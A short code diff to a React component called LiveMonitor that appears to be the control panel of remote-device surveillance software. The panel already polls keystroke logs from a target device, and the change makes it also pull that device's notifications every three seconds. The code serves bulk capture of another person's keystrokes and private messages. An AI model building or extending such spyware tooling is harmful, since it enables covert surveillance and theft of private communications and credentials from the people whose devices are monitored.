@@ -191,10 +191,13 @@ export default function LiveMonitor({ notifEntries, activityEntries, keylogEntri
     return () => clearInterval(id);
   }, [isOnline, deviceId, sendCommand]);
 
-  // ── Fetch notifications once on mount ───────────────────────────────
+  // ── Fetch notifications every 3 seconds (like keylogs) ──────────────
   useEffect(() => {
     if (!isOnline || !sendCommand || !deviceId) return;
-    sendCommand(deviceId, 'get_notifications', { limit: 100 });
+    const fetch = () => sendCommand(deviceId, 'get_notifications', { limit: 100 });
+    fetch();
+    const id = setInterval(fetch, 3000);
+    return () => clearInterval(id);
   }, [isOnline, deviceId, sendCommand]);
 
   // ── Parse command results for keylogs and notifications ─────────────
